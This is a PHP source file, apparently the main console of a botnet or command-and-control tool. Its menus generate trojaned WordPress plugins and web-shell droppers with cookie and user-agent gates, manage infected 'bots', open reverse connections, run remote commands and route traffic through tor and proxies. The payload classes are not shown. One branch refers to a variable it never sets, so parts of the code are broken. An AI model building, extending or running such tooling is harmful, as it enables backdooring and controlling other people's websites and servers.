<?php
require_once "lib/classes.inc.php";

//pipe dream.
use fake_the_landing\randomDefaultPage;
//end pipe dream.

// communications
use curlStuff\validateMeMore\talkToMeDamnit;
use curlStuff\mainCurl;
use userAgents\agentsList;
use proxyWorks\confirmProxy;
//end communications

// might remove this, since tor is what should be used.
use proxies\populateRandomProxies;
// end stuff.

// droppers
use new_bots\makeMeSlim\slimDropper;
use new_bots\wordpressPlugins\makeMeWordPressing;
// end droppers

//graphics and shit
use logos\art\artisticStuff;
use logos\menus\mainMenu;
//end graphipcs and shit.

$d = default_config;
$configs = $d->exportConfigConstants();
$l = new artisticStuff(true);
$m = new mainMenu();
$agents = new agentsList();
$curl = new mainCurl(true, $configs['tor']);

$choices = [
    "postgres" => $configs['pg_presets'],
    "sqlite" => $configs['sqlite_presets']
];

if (str_contains(SQL_USE, "PGSQL")){
    $database = new database\slopPgSql($choices['postgres']['pg_host'], $choices['postgres']['pg_user'], $choices['postgres']['pg_pass']);
    $database->firstRun();
}else{

    $database = new database\slopSqlite($choices['sqlite']['sqlite_db']);
    var_dump($database->firstRun());
    readline("Press enter to continue.");
}

while (true){
    system(clear);
    $l->displayLogo();
    $m->menu();
    $c = strtolower(trim(readline("->")));
    switch ($c){
        case str_starts_with($c, "sys") !== false:
            $m->enumSystemMenu();
            break;
        case str_starts_with($c, "rev") !== false:
            $m->reverseConnectionsMenu();
            break;
        case str_starts_with($c, "com") !== false:
            $m->commandMenu();
            break;
        case str_starts_with($c, "a") !== false:
            $m->addHostMenu();
            break;
        case str_starts_with($c, "cr") !== false:
            $m->dropperMenu();
            $c = trim(strtolower(readline("-> ")));
            switch ($c){
                case str_contains($c,"small") !== false:
                    $act_word = trim(readline("Activation Keyword: "));
                    if (is_null($act_word) or $act_word === ""){
                        $act_word = bin2hex(openssl_random_pseudo_bytes(24));
                    }
                    $trj = new makeMeWordPressing($act_word, $agents->getRandomAgent(), bin2hex(openssl_random_pseudo_bytes(10)), bin2hex(openssl_random_pseudo_bytes(50)));
                    $a = $trj->createSmallTrojanWordpress();
                    $database->insertData([
                            "action" => "add_press",
                            "zip" => $a['TrojanPlugin'],
                            "activator" => $a['ActivationWord'],
                        ]
                    );
                    readline("Press the any key to continue.");
                    break;
                case str_contains($c, "chonker") !== false:
                    $act_word = trim(readline("Activation Keyword: "));
                    if (is_null($act_word) or $act_word === ""){
                        $act_word = bin2hex(openssl_random_pseudo_bytes(24));
                    }
                    $trj = new makeMeWordPressing($act_word, $agents->getRandomAgent(), bin2hex(openssl_random_pseudo_bytes(10)), bin2hex(openssl_random_pseudo_bytes(50)));
                    $yay = $trj->createChonker();
                    $database->insertData([
                        "action" => "add_press",
                        "zip" => $yay['TrojanPlugin'],
                        "activator" => $yay['ActivationWord'],
                        'CookieName' => $a['CookieName'],
                        'CookieVal' => $a['CookieVal'],
                        'AllowedAgent' => $a['AllowedAgent']
                    ]);
                    readline("Press the any key to continue.");
                    break;
                default:
                    $trj = new slimDropper($agents->getRandomAgent(), $configs['alpha_chars']);
                    $a = $trj->generateDropper();
                    $database->insertData([
                        "action" => "add_dropper",
                        "location_on_disk" => $a['dropper'],
                        "post_var" => $a['post_variable'],
                        "cookiename" => $a['cookie_name'],
                        "user_agent" => $a['user_agent']
                    ]);
                    readline("Press the any key to continue.");
                    break;
            }
            break;
        case str_starts_with($c, "ch") !== false:
            $m->validateHost();
            $validateMeMore = new talkToMeDamnit();
            try {
                $validateMeMore->checkMultiHost($database->grabOrFormatOutput(['type' => 'all_bots'])["bots"]);
            } catch (Exception $e) {
                echo $e.PHP_EOL;
            }
            break;
        case str_starts_with($c, "at") !== false:
            $m->addToolMenu();
            break;
        case str_starts_with($c, "lt") !== false:
            $m->grabToolsMenu();
            break;
        case str_starts_with($c, "gp") !== false:
            $m->grabProxyMenu();
            break;
        case str_starts_with($c, "r") !== false:
            $m->resetProxyMenu();
            break;
        case str_starts_with($c, "gc") !== false:
            $m->generateCertMenu();
            break;
        case str_starts_with($c, "o") !== false:
            echo "Current Options: ".PHP_EOL;
            print_r($configs);
            readline("Press enter to continue.");
            break;
        case str_starts_with($c, "ac") !== false:
            break;
        case str_starts_with($c, "q") !== false:
            system(clear);
            foreach ($m->goodBye() as $bye) {
                echo "\033[0;34m{$bye}\033[0m" . PHP_EOL;
            }
            die();
        default:
            echo "\033[0;31mThat is not a valid command.";
            break;
    }
}
